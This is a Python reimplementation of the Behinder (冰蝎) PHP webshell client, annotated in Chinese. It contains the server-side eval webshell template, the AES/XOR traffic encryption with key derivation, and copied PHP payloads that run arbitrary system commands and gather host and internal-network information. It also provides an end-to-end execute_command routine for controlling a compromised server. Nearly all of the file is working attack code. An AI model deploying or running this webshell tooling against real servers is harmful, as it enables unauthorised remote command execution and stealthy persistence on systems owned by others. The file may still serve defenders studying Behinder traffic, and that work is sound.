#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
冰蝎 Behinder v4.1 —— PHP 型 webshell **客户端通信协议** 参考实现
=================================================================

本文件里每一个常量 / 算法都来自 `/home/lpzn/tianhu-tools/tools/behinder/Behinder.jar`
内部的字节码与资源文件；没有一条是凭记忆写的。证据索引（都用 javap/unzip 复核过）：

  [A] AES 参数 + base64 外壳
      net/rebeyond/behinder/resource/transprotocol/default_aes.config
      -> 数组里 type=="php" 那条的 encode/decode 字段（PHP 源码）

  [B] 密钥派生
      net.rebeyond.behinder.utils.Utils.getKey(String)  -> 直接调用 getMD5(String)
      net.rebeyond.behinder.utils.Utils.getMD5(String)  -> hex(md5(s)).substring(0,16)
      net.rebeyond.behinder.core.ShellService.<init>    -> currentKey = Utils.getKey(password)
      net.rebeyond.behinder.core.LegacyCryptor.updateKey -> 把配置里字面量
          "e45e329feb5d925b" 整体替换成上面这个 16 字符 key

  [C] 请求体封装（明文长什么样）
      net.rebeyond.behinder.utils.Utils.getData(ICrypt,String,Map,String)
        -> type=="php" 且 !cryptor.isCustomized() 时：
           payload = "assert|eval(base64_decode('" + base64(phpCode) + "'));"
      net.rebeyond.behinder.core.Params.getParamedPhp(String,Map,TransProtocol)
        -> 拼出 phpCode

  [D] 服务端模板 + 两个 %s 怎么填
      net/rebeyond/behinder/resource/server/shell.php          (模板本体)
      net.rebeyond.behinder.ui.controller.TransProtocolPaneController
        -> String.format(shell, transProtocol.getDecode(), DecryptName)
           DecryptName 默认就是字面量 "Decrypt"

  [E] HTTP 层
      net.rebeyond.behinder.utils.OKHttpClientUtil.post(String,Map,byte[])
      net.rebeyond.behinder.core.ShellService.initHeardersByType / initHeardersCommon
      net.rebeyond.behinder.core.Constants.<clinit>  (userAgents/accepts 池)

  [F] 响应取壳（"body signature"）
      net.rebeyond.behinder.core.ShellService.echo(String) / initBodySignature / extractPayload
      -> AES-ECB 是确定性的，客户端把"我期望的响应密文"算出来，再在响应里 indexOf 定位，
         前后各留 beginIndex / endIndex 个字节的垃圾。

--- 我确证的 / 我推测的 -----------------------------------------------------

【字节码确证】
  * key = md5(password)[:16]（16 个 ASCII 字符当 AES-128 密钥）      [B]
  * AES-128-ECB + PKCS#7，然后整体 base64                             [A]
  * body = 密文（AES 分支是 base64 文本），POST，无表单编码            [C][E]
  * 请求明文 = `assert|eval(base64_decode('<b64 php code>'));`        [C]
  * shell.php 第一个 %s = Decrypt 函数定义，第二个 %s = "Decrypt"     [D]
  * 响应 = base64(AES(JSON))，JSON 每个 value 再 base64 一次          [A][F]
  * 握手 = Echo 随机串比对；PHP 上 AES 失败会自动降级 XOR             [F]
  * 响应会用"本地预估的密文"做 indexOf 定位，剥掉前后垃圾              [F]

【推测（有依据但没直接读到实现）】
  * 客户端实际执行加/解密的 Java 类不在 jar 里，而在发行包同级目录的
    `data.db`（SQLite，表 TransProtocol，id<0 的 legacy 行，
    type="jsp" / name="php_aes"|"php_xor"）。证据：DBClient 里
    DB_PATH="data.db" 且文件缺失直接抛"数据库文件丢失，无法启动"；
    LegacyCryptor.<init> 查的是 findLegacyTransProtocolByTypeAndName("jsp",
    effectType+"_aes")；jar 里只打包了 6 个 default_*.config 示例，没有 php_aes。
    但 PHP 端算法由 [A] 唯一确定，客户端必须与之互逆 —— 所以本实现是
    受约束的唯一解，可用步骤 A2 + C 的实测交叉证明。
  * `php_xor` 用的是 base64+XOR 还是纯 XOR：jar 里的 Crypt.EncryptForPhp 的
    XOR 分支是纯 XOR（无 base64），而 jar 里 default_xor.config 的 php 条目
    是空的、default_xor_base64.config 的 php 条目才是 base64+XOR。本实现按
    base64+XOR 做（与 shell.php 模板一致），并保留 encrypt_type="xor_raw"
    对应纯 XOR 分支。
  * XOR 降级后是否还需要别的收尾（如换 URL）：doConnect 里只看到换 cryptor。
"""

from __future__ import annotations

import base64
import hashlib
import json
import re
import uuid
from typing import Any, Dict, List, Mapping, Optional

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# ===========================================================================
# 0. 从 jar 里抠出来的常量
# ===========================================================================

#: 默认连接密码
DEFAULT_PASSWORD = "rebeyond"

#: [B] 配置里写的字面量密钥，= md5("rebeyond")[:16]，客户端加载时整体替换成真 key
KEY_PLACEHOLDER = "e45e329feb5d925b"

#: [A] default_aes.config 中 type=="php" 的 encode 字段（原样，含占位 key）
PHP_ENCODE_TEMPLATE = r'''	function Encrypt($data)
	{
		$key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
		return base64_encode(openssl_encrypt($data, "AES-128-ECB", $key,OPENSSL_PKCS1_PADDING));
	}'''

#: [A] default_aes.config 中 type=="php" 的 decode 字段（原样，含占位 key）
PHP_DECODE_TEMPLATE = r'''	function Decrypt($data)
	{
		$key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
		return openssl_decrypt(base64_decode($data), "AES-128-ECB", $key,OPENSSL_PKCS1_PADDING);
	}'''

#: [A] 备选协议 default_xor_base64.config 中 type=="php" 的 encode / decode
PHP_ENCODE_XOR_B64 = 'function Encrypt($data)\n{\n    $key="e45e329feb5d925b"; \n\tfor($i=0;$i<strlen($data);$i++) {\n    \t$data[$i] = $data[$i]^$key[$i+1&15]; \n    }\n    $bs="base64_"."encode";\n\t$after=$bs($data."");\n    return $after;\n}'

PHP_DECODE_XOR_B64 = 'function Decrypt($data)\n{\n    $key="e45e329feb5d925b"; \n    $bs="base64_"."decode";\n\t$after=$bs($data."");\n\tfor($i=0;$i<strlen($after);$i++) {\n    \t$after[$i] = $after[$i]^$key[$i+1&15]; \n    }\n    return $after;\n}'

#: [D] 服务端 webshell 模板原文（90 字节，jar 内 net/rebeyond/behinder/resource/server/shell.php）
SHELL_PHP_TEMPLATE = (
    '<?php\n@error_reporting(0);\n%s\n'
    '$post=%s(file_get_contents("php://input"));\n'
    '@eval($post);\n?>'
)

#: [C] 非 custom 协议下，PHP 请求明文的固定外壳
PHP_PAYLOAD_PREFIX = "assert|eval(base64_decode('"
PHP_PAYLOAD_SUFFIX = "'));"

#: [C] 服务端 PHP 载荷动作名 -> jar 内资源路径
PHP_PAYLOAD_DIR = "net/rebeyond/behinder/payload/php/"

#: [A] 冰蝎内置的 PHP 传输协议。客户端与 shell.php 必须成对使用同一个协议，
#: 否则 shell 的 Decrypt 解不开请求（或者更糟：解开了但 payload 内嵌的 Encrypt 不对）。
#:
#: client_encrypt : 客户端 body 用什么算法（对应 LegacyCryptor 里的 encryptType）
#: payload_encode : 塞进服务端 eval 代码里的 Encrypt()，服务端用它加密响应
#: shell_decode   : shell.php 第一个 %s（Decrypt 函数定义）
PHP_PROTOCOLS: Dict[str, Dict[str, str]] = {
    "default_aes": {
        "encrypt_type": "aes",
        "payload_encode": PHP_ENCODE_TEMPLATE,
        "shell_decode": PHP_DECODE_TEMPLATE,
    },
    "default_xor_base64": {
        "encrypt_type": "xor",
        "payload_encode": PHP_ENCODE_XOR_B64,
        "shell_decode": PHP_DECODE_XOR_B64,
    },
}

#: [C] 从 jar 抠出的两个关键载荷（与 jar 内文件逐字节一致，由 test_behinder_roundtrip.py 校验）
PAYLOADS_PHP: Dict[str, str] = {}

PAYLOADS_PHP['Echo'] = '@error_reporting(0);\r\nfunction main($content)\r\n{\r\n\t$result = array();\r\n\t$result["status"] = base64_encode("success");\r\n    $result["msg"] = base64_encode($content);\r\n    @session_start();  //初始化session，避免connect之后直接background，后续getresult无法获取cookie\r\n\r\n    echo encrypt(json_encode($result));\r\n}\r\n'

PAYLOADS_PHP['Cmd'] = '@error_reporting(0);\r\n\r\nfunction getSafeStr($str){\r\n    $s1 = iconv(\'utf-8\',\'gbk//IGNORE\',$str);\r\n    $s0 = iconv(\'gbk\',\'utf-8//IGNORE\',$s1);\r\n    if($s0 == $str){\r\n        return $s0;\r\n    }else{\r\n        return iconv(\'gbk\',\'utf-8//IGNORE\',$str);\r\n    }\r\n}\r\nfunction main($cmd,$path)\r\n{\r\n    @set_time_limit(0);\r\n    @ignore_user_abort(1);\r\n    @ini_set(\'max_execution_time\', 0);\r\n    $result = array();\r\n    $PadtJn = @ini_get(\'disable_functions\');\r\n    if (! empty($PadtJn)) {\r\n        $PadtJn = preg_replace(\'/[, ]+/\', \',\', $PadtJn);\r\n        $PadtJn = explode(\',\', $PadtJn);\r\n        $PadtJn = array_map(\'trim\', $PadtJn);\r\n    } else {\r\n        $PadtJn = array();\r\n    }\r\n    $c = $cmd;\r\n    if (FALSE !== strpos(strtolower(PHP_OS), \'win\')) {\r\n        $c = $c . " 2>&1\\n";\r\n    }\r\n    $JueQDBH = \'is_callable\';\r\n    $Bvce = \'in_array\';\r\n    if ($JueQDBH(\'system\') and ! $Bvce(\'system\', $PadtJn)) {\r\n        ob_start();\r\n        system($c);\r\n        $kWJW = ob_get_contents();\r\n        ob_end_clean();\r\n    } else if ($JueQDBH(\'proc_open\') and ! $Bvce(\'proc_open\', $PadtJn)) {\r\n        $handle = proc_open($c, array(\r\n            array(\r\n                \'pipe\',\r\n                \'r\'\r\n            ),\r\n            array(\r\n                \'pipe\',\r\n                \'w\'\r\n            ),\r\n            array(\r\n                \'pipe\',\r\n                \'w\'\r\n            )\r\n        ), $pipes);\r\n        $kWJW = NULL;\r\n        while (! feof($pipes[1])) {\r\n            $kWJW .= fread($pipes[1], 1024);\r\n        }\r\n        @proc_close($handle);\r\n    } else if ($JueQDBH(\'passthru\') and ! $Bvce(\'passthru\', $PadtJn)) {\r\n        ob_start();\r\n        passthru($c);\r\n        $kWJW = ob_get_contents();\r\n        ob_end_clean();\r\n    } else if ($JueQDBH(\'shell_exec\') and ! $Bvce(\'shell_exec\', $PadtJn)) {\r\n        $kWJW = shell_exec($c);\r\n    } else if ($JueQDBH(\'exec\') and ! $Bvce(\'exec\', $PadtJn)) {\r\n        $kWJW = array();\r\n        exec($c, $kWJW);\r\n        $kWJW = join(chr(10), $kWJW) . chr(10);\r\n    } else if ($JueQDBH(\'exec\') and ! $Bvce(\'popen\', $PadtJn)) {\r\n        $fp = popen($c, \'r\');\r\n        $kWJW = NULL;\r\n        if (is_resource($fp)) {\r\n            while (! feof($fp)) {\r\n                $kWJW .= fread($fp, 1024);\r\n            }\r\n        }\r\n        @pclose($fp);\r\n    } else {\r\n        $kWJW = 0;\r\n        $result["status"] = base64_encode("fail");\r\n        $result["msg"] = base64_encode("none of proc_open/passthru/shell_exec/exec/exec is available");\r\n        $key = $_SESSION[\'k\'];\r\n        echo encrypt(json_encode($result));\r\n        return;\r\n        \r\n    }\r\n    $result["status"] = base64_encode("success");\r\n    $result["msg"] = base64_encode(getSafeStr($kWJW));\r\n    echo encrypt(json_encode($result));\r\n}\r\n\r\n'

PAYLOADS_PHP['BasicInfo'] = 'error_reporting(0);\r\nfunction main($whatever) {\r\n    $result = array();\r\n    ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean();\r\n    $driveList ="";\r\n    if (stristr(PHP_OS,"windows")||stristr(PHP_OS,"winnt"))\r\n    {\r\n        for($i=65;$i<=90;$i++)\r\n    \t{\r\n    \t\t$drive=chr($i).\':/\';\r\n    \t\tfile_exists($drive) ? $driveList=$driveList.$drive.";":\'\';\r\n    \t}\r\n    }\r\n\telse\r\n\t{\r\n\t\t$driveList="/";\r\n\t}\r\n    $currentPath=getcwd();\r\n    //echo "phpinfo=".$info."\\n"."currentPath=".$currentPath."\\n"."driveList=".$driveList;\r\n    $osInfo=PHP_OS;\r\n    $arch="64";\r\n    if (PHP_INT_SIZE == 4) {\r\n        $arch = "32";\r\n    }\r\n    $localIp=gethostbyname(gethostname());\r\n    if ($localIp!=$_SERVER[\'SERVER_ADDR\'])\r\n    {\r\n        $localIp=$localIp." ".$_SERVER[\'SERVER_ADDR\'];\r\n    }\r\n    $extraIps=getInnerIP();\r\n    foreach($extraIps as $ip)\r\n    {\r\n        if (strpos($localIp,$ip)===false)\r\n        {\r\n         $localIp=$localIp." ".$ip;\r\n        }\r\n    }\r\n    $basicInfoObj=array("basicInfo"=>base64_encode($info),"driveList"=>base64_encode($driveList),"currentPath"=>base64_encode($currentPath),"osInfo"=>base64_encode($osInfo),"arch"=>base64_encode($arch),"localIp"=>base64_encode($localIp));\r\n    //echo json_encode($result);\r\n    $result["status"] = base64_encode("success");\r\n    $result["msg"] = base64_encode(json_encode($basicInfoObj));\r\n    //echo json_encode($result);\r\n    //echo openssl_encrypt(json_encode($result), "AES128", $key);\r\n    echo encrypt(json_encode($result));\r\n}\r\nfunction getInnerIP()\r\n{\r\n$result = array();\r\n\r\nif (is_callable("exec"))\r\n{\r\n    $result = array();\r\n    exec(\'arp -a\',$sa);\r\n    foreach($sa as $s)\r\n    {\r\n        if (strpos($s,\'---\')!==false)\r\n\t\t{\r\n\t\t\t$parts=explode(\' \',$s);\r\n\t\t\t$ip=$parts[1];\r\n\t\t\tarray_push($result,$ip);\r\n\t\t}\r\n\t\t//var_dump(explode(\' \',$s));\r\n           // array_push($result,explode(\' \',$s)[1]);\r\n    }\r\n\r\n}\r\n\r\nreturn $result;\r\n}\r\n\r\n\r\n\r\n'

#: [E] User-Agent 池（Constants.<clinit> 的 userAgents 数组）
USER_AGENTS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.55",
]

#: [E] ShellService.initHeardersByType：php 用这个（注意 "Content-type" 是冰蝎原样的写法）
CONTENT_TYPE_PHP = "application/x-www-form-urlencoded"

#: [E] ShellService.initHeardersCommon（原样）
ACCEPT_LANGUAGE = "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"


# ===========================================================================
# 1. 密钥派生
# ===========================================================================

def derive_key(password: str) -> str:
    """[B] 冰蝎的 key = md5(连接密码) 的小写十六进制前 16 个字符。

    这 16 个 ASCII 字符直接当 AES-128 密钥字节用（utf-8 编码后 16 字节）。

    >>> derive_key("rebeyond")
    'e45e329feb5d925b'
    """
    return hashlib.md5(password.encode("utf-8")).hexdigest()[:16]


def magic_num(key: str) -> int:
    """[B] net.rebeyond.behinder.core.Crypt.getMagicNum：
    Integer.parseInt(key.substring(0,2), 16) % 16。

    只被 `aes_with_magic` 这族协议用（在 base64 之后再拼 N 个随机字节当尾巴）。
    default_aes **不用**它；保留在此是为了完整性和便于探测。
    """
    return int(key[:2], 16) % 16


# ===========================================================================
# 2. 加解密（与 PHP 端 openssl_encrypt / openssl_decrypt 互逆）
# ===========================================================================

def _key_bytes(key: str) -> bytes:
    b = key.encode("utf-8")
    if len(b) not in (16, 24, 32):
        raise ValueError(
            "AES 密钥长度必须是 16/24/32 字节，当前 %d 字节：%r。"
            "注意这里要传 derive_key(密码) 的结果，不是原始密码。" % (len(b), key)
        )
    return b


def encrypt(payload_bytes: bytes, key: str, encrypt_type: str = "aes") -> bytes:
    """把明文载荷加密成将要 POST 出去的 body。

    aes  : AES-128-ECB / PKCS#7，再整体 base64（对应 PHP 的
           ``base64_encode(openssl_encrypt($data,"AES-128-ECB",$key,OPENSSL_PKCS1_PADDING))``）
    xor  : ``default_xor_base64`` 协议——先逐字节异或，再 base64
    xor_raw : ``Crypt.EncryptForPhp`` 里的 XOR 分支——纯异或、不 base64

    :param key: derive_key(密码) 得到的 16 字符 AES key
    """
    if encrypt_type == "aes":
        return base64.b64encode(AES.new(_key_bytes(key), AES.MODE_ECB).encrypt(pad(payload_bytes, 16)))
    if encrypt_type == "xor":
        return base64.b64encode(_xor_cycle(payload_bytes, key))
    if encrypt_type == "xor_raw":
        return _xor_cycle(payload_bytes, key)
    raise ValueError("unknown encrypt_type: %r" % (encrypt_type,))


def decrypt(resp_bytes: bytes, key: str, encrypt_type: str = "aes") -> bytes:
    """解密服务端响应（`encrypt` 的逆）。"""
    if encrypt_type == "aes":
        raw = base64.b64decode(resp_bytes)
        return unpad(AES.new(_key_bytes(key), AES.MODE_ECB).decrypt(raw), 16)
    if encrypt_type == "xor":
        return _xor_cycle(base64.b64decode(resp_bytes), key)
    if encrypt_type == "xor_raw":
        return _xor_cycle(resp_bytes, key)
    raise ValueError("unknown encrypt_type: %r" % (encrypt_type,))


def encrypt_raw_aes(payload_bytes: bytes, key: str) -> bytes:
    """不带 base64 的裸 AES-ECB 密文。给 `echo` 的 body-signature 自检用。"""
    return AES.new(_key_bytes(key), AES.MODE_ECB).encrypt(pad(payload_bytes, 16))


def _xor_cycle(data: bytes, key: str) -> bytes:
    """[A]/Crypt.DecryptForAsp：``data[i] ^= key.getBytes()[ (i+1) & 15 ]``。"""
    kb = key.encode("utf-8")
    out = bytearray(data)
    for i in range(len(out)):
        out[i] ^= kb[(i + 1) & 15]
    return bytes(out)


# ===========================================================================
# 3. PHP 载荷组装（Params.getParamedPhp 的等价物）
# ===========================================================================

def get_php_params(php_source: str) -> List[str]:
    """[C] Params.getPhpParams：抓 ``main(...)`` 的形参名（``$x`` -> ``x``）。"""
    m = re.search(r"main\s*\([^\)]*\)", php_source)
    if not m:
        return []
    return re.findall(r"\$([a-zA-Z]*)", m.group(0))


def build_php_code(action: str,
                   params: Mapping[str, str],
                   encode_src: str = PHP_ENCODE_TEMPLATE) -> bytes:
    """把「动作名 + 参数」拼成要送进服务端 eval 的 PHP 源码。

    等价于 Params.getParamedPhp：
        <载荷源码去掉开头 <?> \n <Encrypt 函数定义> \n
        $p="<base64>";$p=base64_decode($p);   # 或 $p="";
        ...
        \\r\\nmain($p1,$p2,...);
    """
    src = PAYLOADS_PHP[action]
    if src.strip().startswith("<?"):
        src = src.replace("<?", "", 1)

    sb = src + "\n" + encode_src + "\n"
    args = ""
    for name in get_php_params(src):
        if name in params:
            val = params[name] if params[name] is not None else ""
            b64 = base64.b64encode(val.encode("utf-8")).decode("ascii")
            sb += '$%s="%s";$%s=base64_decode($%s);' % (name, b64, name, name)
        else:
            sb += '$%s="";' % (name,)
        args += ",$" + name
    args = args.replace(",", "", 1)
    sb += "\r\nmain(" + args + ");"
    return sb.encode("utf-8")


#: PHP 8 兼容前缀。见下方 PHP8_PAYLOAD_PREFIX 的说明。
PHP8_PAYLOAD_PREFIX = 'define("assert",0);' + PHP_PAYLOAD_PREFIX


def wrap_php_payload(php_code: bytes, prefix: str = PHP_PAYLOAD_PREFIX) -> bytes:
    """[C] Utils.getData 的 PHP 外壳：``assert|eval(base64_decode('<b64>'));``

    :param prefix: 外壳前缀。老目标用默认值；PHP 8 目标要传 PHP8_PAYLOAD_PREFIX，
                   原因见模块末尾「PHP 8 兼容」一节。
    """
    return (prefix
            + base64.b64encode(php_code).decode("ascii")
            + PHP_PAYLOAD_SUFFIX).encode("utf-8")


def build_payload(action: str,
                  params: Mapping[str, str],
                  key: str,
                  encode_src: str = PHP_ENCODE_TEMPLATE,
                  encrypt_type: str = "aes",
                  prefix: str = PHP_PAYLOAD_PREFIX) -> bytes:
    """动作名+参数 -> 可直接 POST 的 body（已加密）。"""
    encode_src = encode_src.replace(KEY_PLACEHOLDER, key)
    php_code = build_php_code(action, params, encode_src)
    return encrypt(wrap_php_payload(php_code, prefix), key, encrypt_type)


# ===========================================================================
# 4. HTTP 封装
# ===========================================================================

def build_request(url: str,
                  body: bytes,
                  key: Optional[str] = None,
                  user_agent: Optional[str] = None,
                  referer: Optional[str] = None,
                  extra_headers: Optional[Mapping[str, str]] = None) -> Dict[str, Any]:
    """[E] 构造一次冰蝎 PHP 请求。

    要点（全部来自 OKHttpClientUtil.post + ShellService.initHearders*）：
      * 方法 POST，body 就是**裸密文/密文的 base64 文本**，没有任何 form 编码；
      * Content-type 是 application/x-www-form-urlencoded（PHP 分支写死，虽然 body 不是表单）；
      * 会显式加 Content-Length；
      * Cookie 由 OkHttp 的 CookieJar 按 host:port 维护，跨请求自动带上 -> 这就是会话。
    """
    headers: Dict[str, str] = {}
    headers["Content-type"] = CONTENT_TYPE_PHP
    headers["Accept-Language"] = ACCEPT_LANGUAGE
    headers["User-Agent"] = user_agent if user_agent is not None else USER_AGENTS[0]
    if referer is not None:
        headers["Referer"] = referer
    headers["Content-Length"] = str(len(body))
    if extra_headers:
        headers.update(extra_headers)
    return {"method": "POST", "url": url, "headers": headers, "body": body}


def parse_response(resp_bytes: bytes,
                   compare_mode: Optional[str] = None,
                   begin_index: Optional[int] = None,
                   end_index: Optional[int] = None,
                   prefix_bytes: Optional[bytes] = None,
                   suffix_bytes: Optional[bytes] = None) -> bytes:
    """[F] 剥掉服务端"多余输出"，取出真正的密文段。

    没有做过 `echo` 自检（compare_mode 为 None）时是恒等函数——**这是常见情形**，
    因为冰蝎只有在握手握手阶段才记录 body signature。

    compare_mode="num"  : 直接按 begin/end 下标切
    compare_mode="bytes": 用 prefix/suffix 字节串 indexOf 定位后再切
    """
    if compare_mode == "num":
        if begin_index is None or end_index is None:
            return resp_bytes
        if len(resp_bytes) - end_index >= begin_index:
            return resp_bytes[begin_index:len(resp_bytes) - end_index]
        return resp_bytes
    if compare_mode == "bytes":
        if not prefix_bytes or not suffix_bytes:
            return resp_bytes
        b = resp_bytes.find(prefix_bytes)
        if b < 0:
            return resp_bytes
        b += len(prefix_bytes)
        e = resp_bytes.find(suffix_bytes)
        if e < 0:
            return resp_bytes
        e = len(resp_bytes) - e
        if len(resp_bytes) - e >= b:
            return resp_bytes[b:len(resp_bytes) - e]
        return resp_bytes
    return resp_bytes


def decode_php_result(plain: bytes) -> Dict[str, str]:
    """[F] ShellService.parseCommonAction 的收尾：JSON 的每个 value 再做一次 base64 解码。"""
    obj = json.loads(plain.decode("utf-8"))
    out: Dict[str, str] = {}
    for k, v in obj.items():
        try:
            out[k] = base64.b64decode(v).decode("utf-8")
        except Exception:
            out[k] = v
    return out


# ===========================================================================
# 5. 高层：一次完整的"执行命令"
# ===========================================================================

class BehinderPhpShell:
    """最小可用的冰蝎 PHP 客户端。"""

    def __init__(self,
                 url: str,
                 password: str = DEFAULT_PASSWORD,
                 protocol: str = "default_aes",
                 timeout: float = 15.0):
        if protocol not in PHP_PROTOCOLS:
            raise ValueError("unknown php protocol %r (known: %s)"
                             % (protocol, ", ".join(sorted(PHP_PROTOCOLS))))
        self.url = url
        self.password = password
        self.key = derive_key(password)
        self.protocol = protocol
        self.encrypt_type = PHP_PROTOCOLS[protocol]["encrypt_type"]
        self.payload_encode = PHP_PROTOCOLS[protocol]["payload_encode"]
        self.shell_decode = PHP_PROTOCOLS[protocol]["shell_decode"]
        self.timeout = timeout
        self.user_agent = USER_AGENTS[0]
        self.session = None            # requests.Session，第一次用时创建
        self.compare_mode = None       # None / "num" / "bytes"
        self.begin_index = None
        self.end_index = None
        self.prefix_bytes = None
        self.suffix_bytes = None
        self.last_http: Optional[Dict[str, Any]] = None
        self.last_raw_response: Optional[bytes] = None
        #: 握手时"本地预估的响应密文"是否在真实响应里被 indexOf 命中
        #: （命中 = AES-ECB 确定性得到实测确认，冰蝎能靠它剥掉响应前后的垃圾）
        self.signature_matched: bool = False
        #: PHP 载荷外壳前缀。默认的老写法在 PHP 8 上会致命错误，
        #: 连不上时把它换成 PHP8_PAYLOAD_PREFIX 再试一次即可（见模块末尾说明）。
        self.payload_prefix: str = PHP_PAYLOAD_PREFIX

    # ---- 原始收发 ---------------------------------------------------------

    def _post(self, body: bytes) -> bytes:
        import requests
        if self.session is None:
            self.session = requests.Session()
        req = build_request(self.url, body, self.key,
                            user_agent=self.user_agent,
                            referer=self.url)
        self.last_http = req
        r = self.session.post(req["url"], headers=req["headers"],
                              data=req["body"], timeout=self.timeout)
        self.last_raw_response = r.content
        return r.content

    def action(self, name: str, params: Mapping[str, str]) -> Dict[str, str]:
        """发一个动作，返回 base64 解码后的 {status, msg, ...}。"""
        body = build_payload(name, params, self.key,
                             encode_src=self.payload_encode,
                             encrypt_type=self.encrypt_type,
                             prefix=self.payload_prefix)
        raw = self._post(body)
        cipher = parse_response(raw, self.compare_mode, self.begin_index,
                                self.end_index, self.prefix_bytes, self.suffix_bytes)
        plain = decrypt(cipher, self.key, self.encrypt_type)
        return decode_php_result(plain)

    # ---- 握手 -------------------------------------------------------------

    def connect(self, verbose: bool = False) -> bool:
        """[F] 复刻 ShellService.doConnect / echo()：

        1) 随机长度(1..3000)的随机串 rand
        2) 发 Echo{content: rand}
        3) 本地把**期望的明文 JSON** 也加密一遍，用它定位响应里的密文段（body signature）
        4) 解出来的 msg 必须 == rand
        5) PHP 且 legacy 协议时，AES 解不开会自动降级成 XOR 再试一次
        """
        rand = uuid.uuid4().hex[:random_len()]
        # 注意：这里用的是 % 格式化，所以大括号是字面量（不是 .format() 的 {{ }}）
        expected_plain = ('{"status":"%s","msg":"%s"}' % (
            base64.b64encode(b"success").decode(),
            base64.b64encode(rand.encode()).decode(),
        )).encode("utf-8")

        try:
            raw = self._post(build_payload("Echo", {"content": rand}, self.key,
                                           encode_src=self.payload_encode,
                                           encrypt_type=self.encrypt_type,
                                           prefix=self.payload_prefix))
            expected_cipher = encrypt(expected_plain, self.key, self.encrypt_type)
            # beginIndex = 期望密文在响应里的位置；endIndex = 其后还有多少字节
            b = raw.find(expected_cipher)
            if b < 0:
                # PHP 的 json_encode 默认把 "/" 转义成 "\/"（base64 里会出现 '/'），
                # 用转义版本再找一次。
                esc = expected_plain.replace(b"/", b"\\/")
                ec2 = encrypt(esc, self.key, self.encrypt_type)
                if raw.find(ec2) >= 0:
                    expected_cipher, b = ec2, raw.find(ec2)
            self.signature_matched = b >= 0
            if b > 0:
                self.compare_mode = "num"
                self.begin_index = b
                self.end_index = len(raw) - b - len(expected_cipher)
                if self.begin_index > 0 or self.end_index > 0:
                    self._init_body_signature(raw, self.begin_index, self.end_index)
                else:
                    self.compare_mode = None
            cipher = parse_response(raw, self.compare_mode, self.begin_index,
                                    self.end_index, self.prefix_bytes, self.suffix_bytes)
            res = decode_php_result(decrypt(cipher, self.key, self.encrypt_type))
            ok = res.get("msg") == rand
            if verbose:
                print("  handshake ->", res)
            return ok
        except Exception as e:
            if verbose:
                print("  handshake %s failed: %r" % (self.protocol, e))
            if self.protocol != "default_xor_base64":
                # [F] doConnect 的降级分支：PHP + 非自定义协议，AES 失败就换 XOR 再试
                self.use_protocol("default_xor_base64")
                try:
                    return self.connect(verbose=verbose)
                except Exception as e2:
                    if verbose:
                        print("  handshake xor failed: %r" % (e2,))
                    return False
            return False

    def use_protocol(self, protocol: str) -> None:
        """切换传输协议（不改 URL/密码），同时把 body signature 的缓存清掉。"""
        self.protocol = protocol
        self.encrypt_type = PHP_PROTOCOLS[protocol]["encrypt_type"]
        self.payload_encode = PHP_PROTOCOLS[protocol]["payload_encode"]
        self.shell_decode = PHP_PROTOCOLS[protocol]["shell_decode"]
        self.compare_mode = None
        self.begin_index = self.end_index = None
        self.prefix_bytes = self.suffix_bytes = None

    def _init_body_signature(self, raw: bytes, begin: int, end: int) -> None:
        """[F] ShellService.initBodySignature：取密文前/后最多 20 字节当标记，
        并校验它们确实出现在预期位置；不对就放弃标记。"""
        pstart = max(begin - 20, 0)
        prefix = raw[pstart:begin]
        tail = len(raw) - end
        suffix = raw[tail:tail + min(end, 20)]
        if raw.find(prefix) != pstart or raw.find(suffix) != tail:
            self.prefix_bytes = self.suffix_bytes = None
            self.compare_mode = "num"
            return
        self.prefix_bytes, self.suffix_bytes = prefix, suffix

    # ---- 业务动作 ---------------------------------------------------------

    def run_cmd(self, cmd: str, path: str = "") -> Dict[str, str]:
        """执行系统命令（服务端 Cmd.php）。"""
        return self.action("Cmd", {"cmd": cmd, "path": path})

    #: 别名，语义更直白
    ping = connect

    def basic_info(self) -> Dict[str, str]:
        """[C] BasicInfo.php：拿 phpinfo / 当前目录 / 盘符 / 系统 / 内网 IP。
        注意它的返回值里 msg 又是一层 base64(json)。"""
        return self.action("BasicInfo", {"whatever": ""})


def random_len() -> int:
    """[F] doConnect 里是 ``new SecureRandom().nextInt(3000)``，故上限是 2999。"""
    import random
    return random.randint(1, 2999)


# ===========================================================================
# 5b. 「执行命令」的完整 HTTP 请求组装（一行版）
# ===========================================================================

def build_command_request(url: str,
                          cmd: str,
                          password: str = DEFAULT_PASSWORD,
                          path: str = "",
                          protocol: str = "default_aes",
                          user_agent: Optional[str] = None) -> Dict[str, Any]:
    """把"执行一条系统命令"组装成一个可以直接发出去的 HTTP 请求。

    返回 ``{"method", "url", "headers", "body"}``；body 已经是密文，
    直接 POST 即可（响应拿 ``parse_response`` + ``decrypt`` + ``decode_php_result`` 处理）。
    """
    p = PHP_PROTOCOLS[protocol]
    key = derive_key(password)
    body = build_payload("Cmd", {"cmd": cmd, "path": path}, key,
                         encode_src=p["payload_encode"],
                         encrypt_type=p["encrypt_type"])
    req = build_request(url, body, key, user_agent=user_agent, referer=url)
    req["plaintext_hint"] = "assert|eval(base64_decode('<Cmd.php 代码 + Encrypt 定义 + main(...)>'))"
    return req


def execute_command(url: str,
                    cmd: str,
                    password: str = DEFAULT_PASSWORD,
                    path: str = "",
                    protocol: str = "default_aes",
                    handshake: bool = True) -> Dict[str, str]:
    """端到端执行一条命令，返回 ``{"status": ..., "msg": ...}``。"""
    sh = BehinderPhpShell(url, password, protocol=protocol)
    if handshake and not sh.connect():
        raise RuntimeError("握手失败：目标不是可用的冰蝎 PHP shell，或密码/协议不对")
    return sh.run_cmd(cmd, path)


# ===========================================================================
